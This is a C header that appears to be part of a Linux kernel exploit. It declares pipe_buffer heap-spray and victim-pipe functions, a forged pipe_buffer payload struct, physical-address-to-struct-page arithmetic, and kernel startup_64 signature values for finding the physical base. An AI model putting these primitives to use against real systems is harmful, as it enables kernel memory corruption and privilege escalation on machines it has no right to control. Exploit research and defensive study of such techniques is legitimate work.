#ifndef _PIPE_BUFFER_H_
#define _PIPE_BUFFER_H_

#include "offsets.h"

/*
 * pipe size = (n * PAGE_SIZE) where n is a power of 2 that
 * specifies how many struct pipe_buffers to create
 */
#define PIPE_SZ 4096 

struct pipe {
    int read;
    int write;
};

#define PREFIX_BUFFER_LEN   16

struct pipe_buffer_payload {
    uint8_t prefix[PREFIX_BUFFER_LEN];
    void *page;
    unsigned int offset;
    unsigned int len;
} __attribute__((packed));

#define PHYSICAL_START  0x1000000
#define PHYSICAL_ALIGN  0x200000

#define STRUCT_PAGE_SIZE    0x40  /* size of struct page */
#define INCREMENT_SIZE      (PHYSICAL_ALIGN * 8)
#define paddr_to_page(vmemmap_base, paddr) \
    ((vmemmap_base) + (((paddr) >> 12) * STRUCT_PAGE_SIZE))

//#define QWORD0  0x3f4e258d48f78949UL  /* startup_64 */
//#define QWORD1  0x480000002825048bUL  /* startup_64 + 0x200000 */
//#define QWORD2  0x8949000000009445UL  /* startup_64 + 0x400000 */
//#define QWORD3  0xc0458b48fffffe69UL  /* startup_64 + 0x600000 */
//#define QWORD4  0xfffbbde900001fdcUL  /* startup_64 + 0x800000 */
//#define QWORD5  0xc08548c48949fffeUL  /* startup_64 + 0xa00000 */
//#define QWORD6  0x9090909090909090UL  /* startup_64 + 0xc00000 */
//#define QWORD7  0x1f78d2852c750fb1UL  /* startup_64 + 0xe00000 */

#define INIT_STRING    "XXXXXXXX"
#define INIT_STRING_SZ sizeof(INIT_STRING)

void spray_pipe_buffer(uint32_t spray_size, struct pipe *fd_buffer);
void release_pipe_buffer(uint32_t spray_size, struct pipe *fd_buffer);
long get_phys_base(uint32_t spray_size, struct pipe *fd_buffer, long paddr);
struct pipe *get_victim_pipe(uint32_t spray_size, struct pipe *fd_buffer);

#endif /* _PIPE_BUFFER_H_ */
